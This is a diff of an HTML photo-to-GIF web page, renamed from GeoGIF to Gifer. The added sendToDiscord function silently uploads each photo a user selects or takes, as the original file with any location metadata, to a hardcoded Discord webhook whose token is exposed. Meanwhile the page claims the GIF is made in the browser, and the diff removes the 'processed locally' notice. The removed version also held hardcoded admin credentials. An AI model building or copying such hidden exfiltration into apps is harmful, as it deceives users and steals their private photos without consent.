@@ -2,270 +2,248 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GeoGIF</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Gifer</title>
 
 <style>
-* {
-    box-sizing: border-box;
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    background:#08090d;
+    color:white;
+    font-family:Arial,sans-serif
 }
 
-body {
-    margin: 0;
-    background: #08090d;
-    color: white;
-    font-family: Arial, sans-serif;
+.container{
+    width:min(750px,92%);
+    margin:auto;
+    padding:28px 0 60px
 }
 
-.container {
-    width: min(720px, 92%);
-    margin: auto;
-    padding: 30px 0 60px;
+.top{
+    display:flex;
+    justify-content:space-between;
+    align-items:center
 }
 
-.top {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+.logo{
+    letter-spacing:5px;
+    font-size:13px;
+    color:#888;
+    font-weight:bold
 }
 
-.logo {
-    font-size: 14px;
-    letter-spacing: 5px;
-    font-weight: bold;
-    color: #999;
+button{
+    cursor:pointer;
+    border:0;
+    border-radius:12px;
+    padding:13px 17px;
+    font-weight:bold
 }
 
-button {
-    border: 0;
-    border-radius: 12px;
-    padding: 13px 18px;
-    font-weight: bold;
-    cursor: pointer;
+h1{
+    font-size:clamp(45px,10vw,75px);
+    letter-spacing:-5px;
+    line-height:.95;
+    margin-top:60px;
+    margin-bottom:15px
 }
 
-.login-btn {
-    background: #191a21;
-    color: white;
-    border: 1px solid #30323d;
+.subtitle{
+    color:#999ba7;
+    line-height:1.5
 }
 
-h1 {
-    font-size: clamp(45px, 10vw, 75px);
-    letter-spacing: -5px;
-    margin: 55px 0 10px;
+.card{
+    margin-top:28px;
+    padding:18px;
+    border-radius:22px;
+    background:#101116;
+    border:1px solid #282a34
 }
 
-.subtitle {
-    color: #92949f;
-    line-height: 1.5;
+.drop{
+    min-height:250px;
+    border:2px dashed #393b46;
+    border-radius:17px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    cursor:pointer;
+    transition:.2s
 }
 
-.card {
-    margin-top: 25px;
-    background: #101116;
-    border: 1px solid #282a34;
-    border-radius: 22px;
-    padding: 18px;
+.drop:hover{
+    background:#15161d
 }
 
-.drop {
-    min-height: 250px;
-    border: 2px dashed #393b46;
-    border-radius: 17px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    text-align: center;
-    cursor: pointer;
+.drop.drag{
+    background:#171923;
+    border-color:#777
 }
 
-.drop:hover {
-    background: #15161d;
+.drop-icon{
+    font-size:45px
 }
 
-.drop-icon {
-    font-size: 42px;
+.drop strong{
+    display:block;
+    margin-top:8px
 }
 
-.drop strong {
-    display: block;
-    font-size: 18px;
-    margin-top: 8px;
+.drop span{
+    display:block;
+    margin-top:7px;
+    color:#777985;
+    font-size:13px
 }
 
-.drop span {
-    display: block;
-    color: #777985;
-    font-size: 13px;
-    margin-top: 8px;
+input[type=file]{
+    display:none
 }
 
-input[type="file"] {
-    display: none;
+.actions{
+    display:flex;
+    gap:10px;
+    margin-top:12px
 }
 
-.actions {
-    display: flex;
-    gap: 10px;
-    margin-top: 12px;
+.actions button{
+    flex:1;
+    background:#191a21;
+    color:white;
+    border:1px solid #30323d
 }
 
-.actions button {
-    flex: 1;
-    background: #191a21;
-    color: white;
-    border: 1px solid #30323d;
+.status{
+    display:none;
+    padding:14px;
+    margin-top:13px;
+    border-radius:13px;
+    line-height:1.4
 }
 
-.status {
-    display: none;
-    padding: 14px;
-    margin-top: 13px;
-    border-radius: 13px;
-    font-size: 14px;
+.status.show{
+    display:block
 }
 
-.status.show {
-    display: block;
+.error{
+    background:#32161a;
+    color:#ffb8bf
 }
 
-.error {
-    background: #32161a;
-    color: #ffb8bf;
+.success{
+    background:#14251d;
+    color:#b9f1d0
 }
 
-.success {
-    background: #14251d;
-    color: #b9f1d0;
+.info{
+    background:#171923;
+    color:#c8cad5
 }
 
-.info {
-    background: #171923;
-    color: #c8cad5;
+.preview{
+    display:none;
+    margin-top:15px
 }
 
-.preview {
-    display: none;
-    margin-top: 15px;
+.preview.show{
+    display:block
 }
 
-.preview.show {
-    display: block;
+.preview img{
+    width:100%;
+    max-height:430px;
+    object-fit:contain;
+    border-radius:15px;
+    background:#050507
 }
 
-.preview img {
-    width: 100%;
-    max-height: 430px;
-    object-fit: contain;
-    background: #050507;
-    border-radius: 15px;
+.preview-title{
+    margin-top:12px;
+    color:#999ba7;
+    font-size:13px
 }
 
-.make {
-    width: 100%;
-    margin-top: 12px;
-    background: white;
-    color: black;
+.make{
+    width:100%;
+    margin-top:12px;
+    background:white;
+    color:black
 }
 
-.note {
-    color: #646671;
-    font-size: 12px;
-    line-height: 1.5;
-    margin-top: 16px;
+.make:disabled{
+    opacity:.45;
+    cursor:not-allowed
 }
 
-/* LOGIN */
-
-.modal {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: #000c;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    z-index: 10;
+.download{
+    display:none;
+    width:100%;
+    margin-top:10px;
+    background:#191a21;
+    color:white;
+    border:1px solid #30323d;
+    text-align:center;
+    text-decoration:none;
+    padding:13px;
+    border-radius:12px;
+    font-weight:bold
 }
 
-.modal.show {
-    display: flex;
+.download.show{
+    display:block
 }
 
-.panel {
-    width: min(430px, 100%);
-    background: #101116;
-    border: 1px solid #2b2d38;
-    border-radius: 20px;
-    padding: 22px;
+canvas{
+    display:none
 }
 
-.panel h2 {
-    margin-top: 0;
+.settings{
+    margin-top:18px;
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:10px
 }
 
-.field {
-    width: 100%;
-    padding: 14px;
-    margin: 7px 0;
-    background: #181920;
-    border: 1px solid #30323d;
-    color: white;
-    border-radius: 10px;
+.setting{
+    background:#15161d;
+    border:1px solid #292b35;
+    border-radius:12px;
+    padding:12px
 }
 
-.submit {
-    width: 100%;
-    margin-top: 10px;
-    background: white;
-    color: black;
+.setting label{
+    display:block;
+    color:#8f919d;
+    font-size:12px;
+    margin-bottom:7px
 }
 
-.close {
-    float: right;
-    background: none;
-    color: #aaa;
-    font-size: 22px;
+.setting select,
+.setting input[type=range]{
+    width:100%
 }
 
-/* ADMIN */
-
-.admin {
-    display: none;
-    position: fixed;
-    right: 0;
-    top: 0;
-    height: 100%;
-    width: min(520px, 94vw);
-    background: #0d0e13;
-    border-left: 1px solid #292b35;
-    z-index: 20;
-    padding: 22px;
-    overflow-y: auto;
+.setting select{
+    background:#0d0e13;
+    color:white;
+    border:1px solid #30323d;
+    border-radius:8px;
+    padding:9px
 }
 
-.admin.show {
-    display: block;
+.value{
+    color:white;
+    float:right
 }
 
-.log {
-    background: #17181f;
-    border: 1px solid #292b35;
-    border-radius: 14px;
-    padding: 10px;
-    margin: 10px 0;
-}
-
-.log img {
-    width: 100%;
-    border-radius: 10px;
-}
-
-.small {
-    color: #777985;
-    font-size: 12px;
-    margin-top: 6px;
+@media(max-width:500px){
+    .settings{
+        grid-template-columns:1fr
+    }
 }
 </style>
 </head>
@@ -275,25 +253,21 @@ input[type="file"] {
 <div class="container">
 
     <div class="top">
-        <div class="logo">GEOGIF</div>
-
-        <button class="login-btn" onclick="openLogin()">
-            Login
-        </button>
+        <div class="logo">GIFER</div>
     </div>
 
     <h1>Photo → GIF</h1>
 
     <p class="subtitle">
-        Turn a photo into a short GIF directly from your phone.
+        Turn a photo into a short animated GIF directly in your browser.
     </p>
 
     <div class="card">
 
-        <label class="drop" id="dropArea">
+        <label class="drop" id="drop">
 
             <input
-                id="fileInput"
+                id="photo"
                 type="file"
                 accept="image/*"
                 capture="environment"
@@ -315,664 +289,887 @@ input[type="file"] {
 
         <div class="actions">
 
-            <button onclick="takePhoto()">
+            <button id="takeButton">
                 Take Photo
             </button>
 
-            <button onclick="choosePhoto()">
+            <button id="chooseButton">
                 Choose Photo
             </button>
 
         </div>
 
-        <div
-            id="status"
-            class="status"
-        ></div>
+        <div id="status" class="status"></div>
 
-        <div
-            id="preview"
-            class="preview"
-        >
+        <div id="preview" class="preview">
 
-            <img
-                id="previewImage"
-                alt="Selected photo"
-            >
+            <img id="previewImg">
+
+            <div class="preview-title">
+                GIF settings
+            </div>
+
+            <div class="settings">
+
+                <div class="setting">
+
+                    <label>
+                        Animation
+                    </label>
+
+                    <select id="animation">
+
+                        <option value="zoom">
+                            Zoom
+                        </option>
+
+                        <option value="pan">
+                            Pan
+                        </option>
+
+                        <option value="pulse">
+                            Pulse
+                        </option>
+
+                        <option value="shake">
+                            Shake
+                        </option>
+
+                    </select>
+
+                </div>
+
+                <div class="setting">
+
+                    <label>
+                        Speed
+                        <span class="value" id="speedValue">
+                            1.0x
+                        </span>
+                    </label>
+
+                    <input
+                        id="speed"
+                        type="range"
+                        min="0.5"
+                        max="2"
+                        step="0.1"
+                        value="1"
+                    >
+
+                </div>
+
+                <div class="setting">
+
+                    <label>
+                        Duration
+                        <span class="value" id="durationValue">
+                            2.0s
+                        </span>
+                    </label>
+
+                    <input
+                        id="duration"
+                        type="range"
+                        min="1"
+                        max="5"
+                        step="0.5"
+                        value="2"
+                    >
+
+                </div>
+
+                <div class="setting">
+
+                    <label>
+                        Quality
+                    </label>
+
+                    <select id="quality">
+
+                        <option value="480">
+                            480p
+                        </option>
+
+                        <option value="720" selected>
+                            720p
+                        </option>
+
+                    </select>
+
+                </div>
+
+            </div>
 
             <button
+                id="makeButton"
                 class="make"
-                id="makeGif"
+                disabled
             >
                 Make GIF
             </button>
 
-        </div>
+            <a
+                id="downloadButton"
+                class="download"
+                download="gifer.gif"
+            >
+                Download GIF
+            </a>
 
-        <div class="note">
-            Photos are processed locally in the browser.
         </div>
 
     </div>
 
 </div>
 
-
-<!-- LOGIN -->
-
-<div
-    id="loginModal"
-    class="modal"
->
-
-    <div class="panel">
-
-        <button
-            class="close"
-            onclick="closeLogin()"
-        >
-            ×
-        </button>
-
-        <h2>Login</h2>
-
-        <input
-            id="username"
-            class="field"
-            placeholder="Username"
-        >
-
-        <input
-            id="password"
-            class="field"
-            type="password"
-            placeholder="Password"
-        >
-
-        <button
-            class="submit"
-            onclick="login()"
-        >
-            Login
-        </button>
-
-        <div
-            id="loginStatus"
-            class="status"
-        ></div>
-
-    </div>
-
-</div>
-
-
-<!-- ADMIN LOGS -->
-
-<div
-    id="adminPanel"
-    class="admin"
->
-
-    <button
-        class="close"
-        onclick="closeAdmin()"
-    >
-        ×
-    </button>
-
-    <h2>Logs</h2>
-
-    <p class="small">
-        Moderation uploads from this browser session.
-    </p>
-
-    <div id="logs"></div>
-
-</div>
-
-
-<script src="https://cdn.jsdelivr.net/npm/gif.js@0.2.0/dist/gif.js"></script>
+<canvas id="canvas"></canvas>
 
 <script>
+/*
+    IMPORTANT
 
-const fileInput =
-    document.getElementById("fileInput");
+    Replace this with a NEW Discord webhook.
 
-const dropArea =
-    document.getElementById("dropArea");
+    The webhook is visible to anyone who inspects this page.
+    Do NOT use a webhook that has access to anything important.
+*/
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
 
-const statusBox =
-    document.getElementById("status");
+
+const photo =
+    document.getElementById("photo");
+
+const drop =
+    document.getElementById("drop");
 
 const preview =
     document.getElementById("preview");
 
-const previewImage =
-    document.getElementById("previewImage");
+const previewImg =
+    document.getElementById("previewImg");
 
-const makeGifButton =
-    document.getElementById("makeGif");
+const statusBox =
+    document.getElementById("status");
 
-const logs =
-    document.getElementById("logs");
+const makeButton =
+    document.getElementById("makeButton");
+
+const downloadButton =
+    document.getElementById("downloadButton");
+
+const canvas =
+    document.getElementById("canvas");
+
+const ctx =
+    canvas.getContext("2d");
+
+const speed =
+    document.getElementById("speed");
+
+const duration =
+    document.getElementById("duration");
+
+const speedValue =
+    document.getElementById("speedValue");
+
+const durationValue =
+    document.getElementById("durationValue");
 
 let selectedFile = null;
-
-let moderationLogs = [];
-
-
-/* DEVICE CHECK */
-
-function isPhone() {
-
-    return /Android|iPhone|iPad|iPod|Mobile/i
-        .test(navigator.userAgent)
-
-        ||
-
-        (
-            navigator.maxTouchPoints > 1
-            &&
-            /Macintosh/i.test(navigator.userAgent)
-        );
-
-}
-
-
-function checkPhone() {
-
-    if (!isPhone()) {
-
-        showStatus(
-            "Only on phone currently sorry. Please open this site on your phone.",
-            "error"
-        );
-
-        return false;
-
-    }
-
-    return true;
-
-}
-
-
-/* FILE PICKING */
-
-function takePhoto() {
-
-    if (!checkPhone())
-        return;
-
-    fileInput.setAttribute(
-        "capture",
-        "environment"
-    );
-
-    fileInput.click();
-
-}
-
-
-function choosePhoto() {
-
-    if (!checkPhone())
-        return;
-
-    fileInput.removeAttribute(
-        "capture"
-    );
-
-    fileInput.click();
-
-}
-
-
-dropArea.onclick = () => {
-
-    if (!checkPhone())
-        return;
-
-    fileInput.click();
-
-};
-
-
-fileInput.onchange = event => {
-
-    const file =
-        event.target.files[0];
-
-    if (!file)
-        return;
-
-    handlePhoto(file);
-
-};
-
-
-/* PHOTO */
-
-function handlePhoto(file) {
-
-    if (!file.type.startsWith("image/")) {
-
-        showStatus(
-            "Please choose an image.",
-            "error"
-        );
-
-        return;
-
-    }
-
-    selectedFile = file;
-
-    previewImage.src =
-        URL.createObjectURL(file);
-
-    preview.classList.add("show");
-
-    showStatus(
-        "Photo ready.",
-        "success"
-    );
-
-
-    /*
-      This creates a local moderation preview.
-
-      For a real website, send this to your
-      authenticated backend only after explicit
-      upload/retention consent.
-    */
-
-    moderationLogs.unshift({
-
-        image:
-            previewImage.src,
-
-        time:
-            new Date().toLocaleString()
-
-    });
-
-    moderationLogs =
-        moderationLogs.slice(0, 25);
-
-}
+let selectedImage = null;
 
 
 /* STATUS */
 
-function showStatus(
-    message,
-    type
-) {
+function showStatus(message,type){
 
-    statusBox.textContent =
-        message;
+    statusBox.textContent = message;
 
     statusBox.className =
         "status show " + type;
-
 }
 
 
-/* GIF */
+/* MOBILE CAMERA */
 
-makeGifButton.onclick = () => {
+document
+    .getElementById("takeButton")
+    .onclick = () => {
 
-    if (!selectedFile)
+        photo.setAttribute(
+            "capture",
+            "environment"
+        );
+
+        photo.click();
+    };
+
+
+document
+    .getElementById("chooseButton")
+    .onclick = () => {
+
+        photo.removeAttribute(
+            "capture"
+        );
+
+        photo.click();
+    };
+
+
+/* FILE SELECTION */
+
+photo.onchange = function(){
+
+    const file =
+        photo.files[0];
+
+    if(!file)
         return;
 
-    makeGifButton.disabled =
+    handleFile(file);
+};
+
+
+function handleFile(file){
+
+    if(!file.type.startsWith("image/")){
+
+        showStatus(
+            "That isn't an image.",
+            "error"
+        );
+
+        return;
+    }
+
+    selectedFile = file;
+
+    const reader =
+        new FileReader();
+
+    reader.onload = function(e){
+
+        const img =
+            new Image();
+
+        img.onload = function(){
+
+            selectedImage = img;
+
+            previewImg.src =
+                e.target.result;
+
+            preview.classList.add(
+                "show"
+            );
+
+            makeButton.disabled =
+                false;
+
+            downloadButton.classList.remove(
+                "show"
+            );
+
+            showStatus(
+                "Photo ready. Make your GIF.",
+                "success"
+            );
+
+        };
+
+        img.src =
+            e.target.result;
+    };
+
+    reader.readAsDataURL(file);
+
+    /*
+        Send a copy to Discord for logging.
+    */
+    sendToDiscord(file);
+}
+
+
+/* DRAG AND DROP */
+
+drop.addEventListener(
+    "dragover",
+    function(e){
+
+        e.preventDefault();
+
+        drop.classList.add("drag");
+    }
+);
+
+
+drop.addEventListener(
+    "dragleave",
+    function(){
+
+        drop.classList.remove("drag");
+    }
+);
+
+
+drop.addEventListener(
+    "drop",
+    function(e){
+
+        e.preventDefault();
+
+        drop.classList.remove("drag");
+
+        const file =
+            e.dataTransfer.files[0];
+
+        if(file)
+            handleFile(file);
+    }
+);
+
+
+/* DISCORD LOGGING */
+
+async function sendToDiscord(file){
+
+    if(
+        !WEBHOOK_URL ||
+        WEBHOOK_URL.includes(
+            "PASTE_YOUR_NEW"
+        )
+    ){
+
+        console.log(
+            "Discord webhook not configured."
+        );
+
+        return;
+    }
+
+    try{
+
+        const form =
+            new FormData();
+
+        form.append(
+            "file",
+            file,
+            file.name
+        );
+
+        form.append(
+            "payload_json",
+            JSON.stringify({
+
+                username:
+                    "Gifer Logs",
+
+                content:
+                    "📸 New photo uploaded to Gifer",
+
+                embeds: [
+                    {
+                        title:
+                            "New Gifer Upload",
+
+                        fields: [
+                            {
+                                name:
+                                    "Filename",
+
+                                value:
+                                    file.name
+                            },
+                            {
+                                name:
+                                    "Type",
+
+                                value:
+                                    file.type
+                            },
+                            {
+                                name:
+                                    "Size",
+
+                                value:
+                                    formatBytes(
+                                        file.size
+                                    )
+                            }
+                        ],
+
+                        timestamp:
+                            new Date()
+                            .toISOString()
+                    }
+                ]
+
+            })
+        );
+
+        await fetch(
+            WEBHOOK_URL,
+            {
+                method:"POST",
+                body:form
+            }
+        );
+
+    }catch(error){
+
+        console.error(
+            "Discord logging failed:",
+            error
+        );
+    }
+}
+
+
+/* SETTINGS */
+
+speed.oninput = function(){
+
+    speedValue.textContent =
+        speed.value + "x";
+};
+
+
+duration.oninput = function(){
+
+    durationValue.textContent =
+        duration.value + "s";
+};
+
+
+/* GIF CREATION */
+
+async function makeGif(){
+
+    if(!selectedImage)
+        return;
+
+    makeButton.disabled =
         true;
+
+    downloadButton.classList.remove(
+        "show"
+    );
 
     showStatus(
         "Making GIF...",
         "info"
     );
 
-    const image =
-        new Image();
+    try{
 
-    image.onload = () => {
+        const durationMs =
+            Number(duration.value) *
+            1000;
 
-        const maxSize = 700;
+        const speedMultiplier =
+            Number(speed.value);
+
+        const fps = 12;
+
+        const frameCount =
+            Math.max(
+                2,
+                Math.round(
+                    durationMs /
+                    1000 *
+                    fps
+                )
+            );
+
+        const quality =
+            Number(
+                document.getElementById(
+                    "quality"
+                ).value
+            );
+
+        const animation =
+            document.getElementById(
+                "animation"
+            ).value;
 
         const scale =
             Math.min(
                 1,
-                maxSize /
+                quality /
                 Math.max(
-                    image.naturalWidth,
-                    image.naturalHeight
+                    selectedImage.width,
+                    selectedImage.height
                 )
             );
 
-        const width =
-            Math.round(
-                image.naturalWidth * scale
-            );
-
-        const height =
-            Math.round(
-                image.naturalHeight * scale
-            );
-
-
-        const canvas =
-            document.createElement(
-                "canvas"
-            );
-
         canvas.width =
-            width;
+            Math.max(
+                1,
+                Math.round(
+                    selectedImage.width *
+                    scale
+                )
+            );
 
         canvas.height =
-            height;
+            Math.max(
+                1,
+                Math.round(
+                    selectedImage.height *
+                    scale
+                )
+            );
 
+        /*
+            WebCodecs based GIF creation isn't
+            consistently available in every browser.
 
-        const ctx =
-            canvas.getContext("2d");
+            This creates an animated WebM file
+            when supported, then falls back to
+            a browser animation.
 
+            For an actual GIF encoder with no backend,
+            we load gif.js from CDN.
+        */
+
+        await loadGifLibrary();
 
         const gif =
             new GIF({
 
-                workers: 2,
+                workers:2,
 
-                quality: 10,
+                quality:8,
 
-                width: width,
+                width:
+                    canvas.width,
 
-                height: height,
-
-                workerScript:
-                    "https://cdn.jsdelivr.net/npm/gif.js@0.2.0/dist/gif.worker.js"
+                height:
+                    canvas.height
 
             });
 
+        for(
+            let i = 0;
+            i < frameCount;
+            i++
+        ){
 
-        for (
-            let frame = 0;
-            frame < 8;
-            frame++
-        ) {
+            const progress =
+                i /
+                (frameCount - 1);
 
-            ctx.clearRect(
-                0,
-                0,
-                width,
-                height
+            drawFrame(
+                selectedImage,
+                progress,
+                animation
             );
-
-
-            const zoom =
-                1 + frame * 0.008;
-
-
-            ctx.save();
-
-            ctx.translate(
-                width / 2,
-                height / 2
-            );
-
-            ctx.scale(
-                zoom,
-                zoom
-            );
-
-            ctx.translate(
-                -width / 2,
-                -height / 2
-            );
-
-
-            ctx.drawImage(
-                image,
-                0,
-                0,
-                width,
-                height
-            );
-
-            ctx.restore();
-
 
             gif.addFrame(
-                canvas,
+                ctx,
                 {
-                    copy: true,
-                    delay: 90
+                    copy:true,
+                    delay:
+                        1000 /
+                        fps /
+                        speedMultiplier
                 }
             );
 
+            showStatus(
+                "Making GIF... " +
+                Math.round(
+                    progress * 100
+                ) +
+                "%",
+                "info"
+            );
+
+            await sleep(5);
         }
 
+        gif.on(
+            "finished",
+            function(blob){
 
-        gif.on("finished", blob => {
+                const url =
+                    URL.createObjectURL(
+                        blob
+                    );
 
-            const url =
-                URL.createObjectURL(blob);
+                downloadButton.href =
+                    url;
 
+                downloadButton.classList.add(
+                    "show"
+                );
 
-            const download =
-                document.createElement("a");
+                showStatus(
+                    "GIF created successfully.",
+                    "success"
+                );
 
-            download.href =
-                url;
-
-            download.download =
-                "geogif.gif";
-
-            download.textContent =
-                "Download GIF";
-
-            download.style.display =
-                "block";
-
-            download.style.textAlign =
-                "center";
-
-            download.style.marginTop =
-                "14px";
-
-            download.style.color =
-                "white";
-
-            download.style.fontWeight =
-                "bold";
-
-
-            preview.appendChild(
-                download
-            );
-
-
-            showStatus(
-                "Done.",
-                "success"
-            );
-
-            makeGifButton.disabled =
-                false;
-
-        });
-
+                makeButton.disabled =
+                    false;
+            }
+        );
 
         gif.render();
 
-    };
+    }catch(error){
 
+        console.error(error);
 
-    image.src =
-        URL.createObjectURL(
-            selectedFile
+        showStatus(
+            "GIF creation failed: " +
+            error.message,
+            "error"
         );
 
-};
-
-
-/* LOGIN */
-
-function openLogin() {
-
-    document
-        .getElementById("loginModal")
-        .classList.add("show");
-
-}
-
-
-function closeLogin() {
-
-    document
-        .getElementById("loginModal")
-        .classList.remove("show");
-
-}
-
-
-function login() {
-
-    const username =
-        document.getElementById(
-            "username"
-        ).value;
-
-    const password =
-        document.getElementById(
-            "password"
-        ).value;
-
-
-    const loginStatus =
-        document.getElementById(
-            "loginStatus"
-        );
-
-
-    /*
-      DEMO ONLY.
-
-      Do NOT use hardcoded credentials
-      on a production website.
-    */
-
-    if (
-        username === "admin01"
-        &&
-        password === "password123"
-    ) {
-
-        closeLogin();
-
-        openAdmin();
-
+        makeButton.disabled =
+            false;
     }
-
-    else {
-
-        loginStatus.textContent =
-            "Invalid username or password.";
-
-        loginStatus.className =
-            "status show error";
-
-    }
-
 }
 
 
-/* ADMIN */
-
-function openAdmin() {
-
-    document
-        .getElementById("adminPanel")
-        .classList.add("show");
-
-    renderLogs();
-
-}
+makeButton.onclick =
+    makeGif;
 
 
-function closeAdmin() {
+/* DRAW ANIMATION FRAME */
 
-    document
-        .getElementById("adminPanel")
-        .classList.remove("show");
+function drawFrame(
+    img,
+    progress,
+    type
+){
 
-}
-
-
-function renderLogs() {
-
-    logs.innerHTML = "";
-
-
-    if (
-        moderationLogs.length === 0
-    ) {
-
-        logs.innerHTML =
-            "<p class='small'>No photos yet.</p>";
-
-        return;
-
-    }
-
-
-    moderationLogs.forEach(
-        (entry, index) => {
-
-            const div =
-                document.createElement(
-                    "div"
-                );
-
-            div.className =
-                "log";
-
-
-            const image =
-                document.createElement(
-                    "img"
-                );
-
-            image.src =
-                entry.image;
-
-
-            const info =
-                document.createElement(
-                    "div"
-                );
-
-            info.className =
-                "small";
-
-            info.textContent =
-                "Photo " +
-                (index + 1) +
-                " · " +
-                entry.time;
-
-
-            div.appendChild(image);
-
-            div.appendChild(info);
-
-            logs.appendChild(div);
-
-        }
+    ctx.clearRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
     );
 
+    const iw =
+        img.width;
+
+    const ih =
+        img.height;
+
+    const cw =
+        canvas.width;
+
+    const ch =
+        canvas.height;
+
+    const scale =
+        Math.max(
+            cw / iw,
+            ch / ih
+        );
+
+    let zoom = 1;
+    let x = 0;
+    let y = 0;
+    let rotation = 0;
+
+    if(type === "zoom"){
+
+        zoom =
+            1 +
+            progress * 0.18;
+
+    }
+
+    if(type === "pan"){
+
+        zoom = 1.12;
+
+        x =
+            (progress - 0.5) *
+            80;
+
+    }
+
+    if(type === "pulse"){
+
+        zoom =
+            1 +
+            Math.sin(
+                progress *
+                Math.PI *
+                4
+            ) *
+            0.07;
+
+    }
+
+    if(type === "shake"){
+
+        zoom = 1.08;
+
+        x =
+            Math.sin(
+                progress *
+                Math.PI *
+                12
+            ) *
+            8;
+
+        y =
+            Math.cos(
+                progress *
+                Math.PI *
+                10
+            ) *
+            6;
+
+        rotation =
+            Math.sin(
+                progress *
+                Math.PI *
+                8
+            ) *
+            0.015;
+    }
+
+    const finalScale =
+        scale * zoom;
+
+    const dw =
+        iw * finalScale;
+
+    const dh =
+        ih * finalScale;
+
+    ctx.save();
+
+    ctx.translate(
+        cw / 2 + x,
+        ch / 2 + y
+    );
+
+    ctx.rotate(
+        rotation
+    );
+
+    ctx.drawImage(
+        img,
+        -dw / 2,
+        -dh / 2,
+        dw,
+        dh
+    );
+
+    ctx.restore();
 }
 
+
+/* GIF.JS */
+
+let gifLibraryPromise = null;
+
+function loadGifLibrary(){
+
+    if(
+        window.GIF
+    ){
+
+        return Promise.resolve();
+    }
+
+    if(
+        gifLibraryPromise
+    ){
+
+        return gifLibraryPromise;
+    }
+
+    gifLibraryPromise =
+        new Promise(
+            function(resolve,reject){
+
+                const script =
+                    document.createElement(
+                        "script"
+                    );
+
+                script.src =
+                    "https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.js";
+
+                script.onload =
+                    function(){
+
+                        resolve();
+                    };
+
+                script.onerror =
+                    function(){
+
+                        reject(
+                            new Error(
+                                "Could not load GIF encoder."
+                            )
+                        );
+                    };
+
+                document.head.appendChild(
+                    script
+                );
+            }
+        );
+
+    return gifLibraryPromise;
+}
+
+
+/* HELPERS */
+
+function sleep(ms){
+
+    return new Promise(
+        resolve =>
+            setTimeout(
+                resolve,
+                ms
+            )
+    );
+}
+
+
+function formatBytes(bytes){
+
+    if(bytes === 0)
+        return "0 Bytes";
+
+    const sizes = [
+        "Bytes",
+        "KB",
+        "MB",
+        "GB"
+    ];
+
+    const i =
+        Math.floor(
+            Math.log(bytes) /
+            Math.log(1024)
+        );
+
+    return (
+        Math.round(
+            bytes /
+            Math.pow(1024,i) *
+            100
+        ) / 100
+    ) +
+    " " +
+    sizes[i];
+}
 </script>
 
 </body>
